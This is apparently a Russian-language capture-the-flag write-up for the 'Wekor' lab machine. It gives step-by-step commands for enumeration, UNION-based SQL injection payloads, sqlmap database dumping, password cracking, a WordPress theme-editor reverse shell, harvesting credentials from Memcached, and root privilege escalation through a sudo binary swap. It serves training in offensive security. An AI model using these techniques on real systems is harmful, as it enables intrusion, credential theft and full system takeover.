# Write-up: Wekor

## Enumeration

Сканируем цель:

```bash
sudo nmap -sS -sV -sC -p- --min-rate=1500 10.144.147.57
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 9 disallowed entries
| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot
|_/comingreallysoon /interesting
```

## Port 80

Открываем сайт:

![Главная](img/Pasted_image_20261123141613.png)

## robots.txt

Смотрим `robots.txt`:

![robots.txt](img/Pasted_image_20261123143533.png)

```text
User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting
```

Пробуем каждый эндпоинт. Где-то в конце `/` не хватает, где-то наоборот — подбираем вручную.

## /comingreallysoon/

Открываем `/comingreallysoon/`:

![comingreallysoon](img/Pasted_image_20261123143428.png)

```text
Welcome Dear Client!
We've setup our latest website on /it-next, Please go check it out!
If you have any comments or suggestions, please tweet them to @faketwitteraccount!
Thanks a lot !
```

Переходим на `/it-next`.

## /it-next

![it-next](img/Pasted_image_20261123143833.png)

Сайт объёмный, поэтому запускаю `gobuster` и параллельно смотрю трафик в Burp.

Находим корзину с купоном на `/it_cart.php`, которая уязвима к SQL-инъекции:

![it_cart.php](img/Pasted_image_20261123145649.png)

## SQL-инъекция

Пробуем классический payload:

```sql
' UNION SELECT 1 -- -
```

![UNION 1](img/Pasted_image_20261123145818.png)

```text
The used SELECT statements have a different number of columns
```

Прямая подсказка — перебираем количество столбцов, пока не получим совпадение:

```sql
' UNION SELECT 1,2,3 -- -
```

![UNION 1,2,3](img/Pasted_image_20261123150210.png)

Проверяем, что можем читать таблицы:

```sql
' UNION SELECT table_name,2,3 FROM information_schema.tables -- -
```

![information_schema.tables](img/Pasted_image_20261123151119.png)

Слишком много таблиц — дальше удобнее через `sqlmap`.

## sqlmap

Сохраняем запрос из Burp в `requests.txt`:

![Сохранение запроса](img/Pasted_image_20261123151454.png)

Запускаем:

```bash
sqlmap -r requests.txt --dbs
```

![sqlmap --dbs](img/Pasted_image_20261123154851.png)

Находим базу `wordpress` и дампим `wp_users`:

```bash
sqlmap -r requests.txt -D wordpress -T wp_users --dump
```

![Дамп wp_users](img/Pasted_image_20261123155133.png)



## Крек hashes

Крек `phpass`-хэшей через `john`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass hashes.txt
```

![john](img/Pasted_image_20261123155444.png)

```text
wp_yura:soccer13
```

Заходим в WordPress:

```text
http://site.wekor.thm/wordpress/wp-login.php
```

![wp-login](img/Pasted_image_20261123171423.png)

## RCE через Theme Editor

Мы админ. Идём в `Appearance → Theme File Editor` и заменяем `404.php` на `reverse_shell.php` (взял от pentestmonkey):

![Theme Editor](img/Pasted_image_20261123171737.png)

Открываем `404.php`, получаем шелл:

```text
http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php
```

![Reverse shell](img/Pasted_image_20261123172424.png)

## Внутренний сервис

Стабилизируем шелл и смотрим порты:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ss -tulnp
```

![ss -tulnp](img/Pasted_image_20261123173522.png)

Находим порт `11211` — это **Memcached**.

![Memcached](img/Pasted_image_20261123173451.png)

Подключаемся через telnet и вытаскиваем креды:

![Memcached creds](img/Pasted_image_20261123173646.png)

```text
Orka:OrkAiSC00L24/7$
```

Заходим:

```bash
su Orka
```

![su Orka](img/Pasted_image_20261123174018.png)

## PrivEsc

Проверяем `sudo`:

```bash
sudo -l
```

```text
User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
```

Смотрим строки в бинаре:

```bash
strings bitcoin
```

![strings bitcoin](img/Pasted_image_20261123180013.png)

Пароль — `password`:

![bitcoin](img/Pasted_image_20261123180748.png)

Подменяем бинарь на `bash`:

```bash
mv Desktop clone
mkdir Desktop
cp /bin/bash ./Desktop/bitcoin
sudo /home/Orka/Desktop/bitcoin
```

Получаем root и читаем флаг:

![root](img/Pasted_image_20261123180748.png)

## Итоговая схема (Kill Chain)

`robots.txt` → `/comingreallysoon → /it-next` → `it_cart.php (SQLi)` → `sqlmap (wp_users dump)` → `john (wp_yura:soccer13)` → `Theme Editor RCE` → `Memcached (Orka creds)` → `sudo bitcoin (подмена на bash)` → `root`